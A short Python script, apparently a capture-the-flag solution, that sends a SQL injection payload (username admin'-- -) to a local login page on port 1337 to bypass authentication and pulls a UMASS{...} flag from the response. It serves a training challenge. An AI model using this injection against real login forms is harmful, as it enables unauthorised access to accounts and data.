import re
import requests as r

c = r.session()
p = c.get("http://localhost:1337/login?username=admin'-- -&password=a")
# print(p.text)
print(re.match(r'.*?(UMASS{.*?}).*?',p.text, re.DOTALL).groups()[0])